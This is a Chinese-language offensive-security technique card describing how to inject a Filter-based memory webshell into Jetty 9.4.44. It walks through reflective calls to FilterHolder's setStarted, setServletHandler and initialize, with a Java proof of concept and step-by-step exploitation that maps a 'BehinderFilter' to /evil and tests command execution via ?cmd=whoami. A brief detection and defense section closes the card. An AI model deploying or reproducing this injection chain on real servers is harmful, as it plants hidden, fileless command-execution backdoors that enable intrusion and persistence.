---
id: web-java-component-jetty9-filterholder-initialize-bypass
title: Jetty 9.4.44+ FilterHolder 内存马初始化绕过：setStarted + setServletHandler + initialize
type: scenario
domain: web
path: web/java/component
technique: jetty9-filterholder-initialize-bypass
aliases:
- Jetty 9.4.44 内存马
- FilterHolder.initialize
- setStarted 绕过
- _filter 为空
- Jetty 高版本 Filter 内存马
- Not started 异常
tags:
- java
- jetty
- memshell
- filter
- filterholder
- lifecycle
- reflection
- classloader
cve: []
severity: critical
confidence: high
affected_versions: Jetty 9.4.44.v20210927（原文验证版本）
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V296
  verified_at: '2026-11-08T08:15:54+08:00'
  notes: 已对照原文与43张图核对：9.4.44 FilterHolder.setFilter 只调 setInstance（图34），Holder.setInstance→BaseHolder.setInstance 只写 _instance（图35/36），initialize 中 _filter==null 时先 super.initialize()（图37），AbstractLifeCycle.initialize 要求 isStarted() 即 _state==2 否则抛 Not started（图38/39），private setStarted() 置 _state=2（图40），wrap 时 getServletHandler().getServletContext() 因 _servletHandler=null 触发 NPE（图41/42），补 setServletHandler 后成功回显（图43）均与卡片一致。修正：initialize() 实为 public，步骤 5 原写私有/受保护已改为 public 无参（原文仍 setAccessible 反射调用）。未验证点：未本机复跑；affected_versions 按原文 9.4.44 验证版本保留；frontmatter 无 sources/source_url。dup-scan 与 Filter 卡 likely_duplicate，但本卡是 9.4.44 生命周期初始化绕过（setStarted+setServletHandler+initialize），Filter 卡是 _filterPathMappings 注入主链（9.0.7），互为补充非同一改写，并列保留。
---

## 一句话结论

Jetty 9.4.44 的 `FilterHolder.setFilter(Filter)` 只调用 `setInstance` 把实例放进 `_instance`，不会写 `_filter`；而 `FilterHolder.initialize()` 会先检查生命周期 `_state == 2`，再通过 `wrap()` 调用 `getServletHandler().getServletContext()`。因此注入 Filter 内存马时必须反射补三步：`setStarted()` 把状态改成 2、`setServletHandler(servletHandler)` 补上非空 handler、再调用 `initialize()`，`_filter` 才会就绪。

## 原理

- **setFilter 的调用链**：9.4.44 中 `FilterHolder.setFilter(Filter)` 只执行 `this.setInstance(filter)`；`Holder.setInstance` 再转 `BaseHolder.setInstance`，最终只给 `_instance` 赋值并 `setHeldClass(instance.getClass())`。`_filter` 仍是 null，`FilterMapping.getFilterHolder().getFilter()` 拿到空值，Filter 不会生效。
- **initialize 的三道关卡**：
  1. `FilterHolder.initialize()` 在 `_filter == null` 时先调用 `super.initialize()`；父类 `AbstractLifeCycle.initialize()` 检查 `isStarted()`，即 `_state == 2`，默认 `_state = 0`，直接抛 `IllegalStateException("Not started: ...")`。
  2. 通过检查后执行 `_filter = (Filter) getInstance()`，把 `_instance` 赋给 `_filter`。
  3. 再执行 `_filter = (Filter) wrap(_filter, WrapFunction.class, WrapFunction::wrapFilter)`；`wrap()` 内部调用 `this.getServletHandler().getServletContext()`，而 holder 的 `_servletHandler` 默认 null，导致 NPE。
- **绕过顺序**：反射调用私有的 `setStarted()`（把 `_state` 置 2 并通知生命周期监听器）→ `setServletHandler(servletHandler)`（补上 `_servletHandler`）→ `initialize()`。三步完成后 `_filter` 指向真正的 Filter 实例，`FilterMapping` 挂到 `_filterPathMappings` 后才能命中请求。
- **为什么必须绕过而不是重写**：`_filter` 是私有字段，`initialize()` 还会做 `wrap()` 包装（用于 Filter 的异步/安全包装）；直接反射写 `_filter` 可能跳过包装逻辑，行为不一致。按原生命周期走完更稳。
- **副作用**：`setStarted()` 会把 holder 标记为 STARTED 并触发监听器；在活容器中强行改状态可能影响 holder 的生命周期管理，测试环境优先。

## 触发条件

- 目标为 Jetty 9.4.44.v20210927 或行为相同的 9.4.x（`setFilter` → `setInstance`，`_filter` 延迟到 `initialize()`）。
- 已能取得 `ServletHandler` 并构造 `FilterHolder`/`FilterMapping`（见 Jetty Filter 内存马卡）。
- 能反射调用私有 `setStarted()`、`setServletHandler()`、`initialize()`。
- 目标未禁用反射或未对生命周期状态做额外校验。

## 利用步骤

1. 按基础 Filter 内存马流程取得 `ServletHandler`，用容器类加载器构造 `FilterHolder`。
2. `setFilter(filter)`、`setName("BehinderFilter")`。
3. 反射调用 `setStarted()`（无参，私有）把 `_state` 置 2。
4. 反射调用 `setServletHandler(servletHandler)`，保证 `wrap()` 内 `getServletHandler()` 非空。
5. 反射调用 `initialize()`（public 无参，原文仍 setAccessible 调用），让 `_filter = getInstance()` 并完成 wrap。
6. 构造 `FilterMapping`，`setFilterHolder(holder)`、`setPathSpec("/evil")`，加入 `_filterPathMappings`。
7. 访问 `/evil?cmd=whoami` 验证回显；测试后重启进程。

## PoC

```java
ClassLoader cl = servletHandler.getClass().getClassLoader();
Object holder = cl.loadClass("org.eclipse.jetty.servlet.FilterHolder")
        .getDeclaredConstructor().newInstance();

holder.getClass().getDeclaredMethod("setFilter", javax.servlet.Filter.class)
        .invoke(holder, new BehinderFilter());
holder.getClass().getSuperclass().getDeclaredMethod("setName", String.class)
        .invoke(holder, "BehinderFilter");

// 1) 生命周期置为 STARTED（_state = 2）
java.lang.reflect.Method setStarted = holder.getClass()
        .getDeclaredMethod("setStarted");
setStarted.setAccessible(true);
setStarted.invoke(holder);

// 2) 补 _servletHandler，避免 wrap() 内 NPE
java.lang.reflect.Method setSH = holder.getClass()
        .getDeclaredMethod("setServletHandler", servletHandler.getClass());
setSH.setAccessible(true);
setSH.invoke(holder, servletHandler);

// 3) 初始化，_filter = getInstance() 并 wrap
java.lang.reflect.Method init = holder.getClass()
        .getDeclaredMethod("initialize");
init.setAccessible(true);
init.invoke(holder);

// 之后构造 FilterMapping 并加入 _filterPathMappings（同基础 Filter 卡）
```

## 变体与关联

- **9.0.7 及更早**：`setFilter` 直接写 `_filter`，不需要这三步；见 [[web-java-component-jetty9-servlethandler-filter-memshell]]。
- **ServletHolder**：`setServlet` 的实现路径不同；若同样只写 `_instance`，可复用 `setStarted`/`initialize` 思路，但参数与包装函数不同。
- **其他生命周期校验**：若目标改写了 `AbstractLifeCycle` 或加了状态机校验，`setStarted` 可能不生效，需要按实际字段/方法调整。
- **关联**：[[web-java-classloader-container-type-identity-memshell]]（类加载器身份）；[[web-java-component-jetty11-threadlocal-header-memshell]]（Jetty 11 替代方案）。

## 检测与防御

- **检测**：监控对 `FilterHolder.setStarted`、`setServletHandler`、`initialize` 的反射调用；检查 `FilterHolder._state` 被异常置 2、`_servletHandler` 被注入；内存马扫描时同时检查 `_filter`/`_instance` 与 web.xml 是否一致。
- **防御**：修补任意字节码加载入口；RASP 对生命周期方法反射调用告警；Jetty 升级并限制反射；发现后重启进程、轮换凭据。
- **边界**：强行 `setStarted` 会触发监听器并改变 holder 状态，生产环境可能有副作用；不同 9.4.x 小版本的私有方法名/可见性可能变化，需按目标 jar 确认。
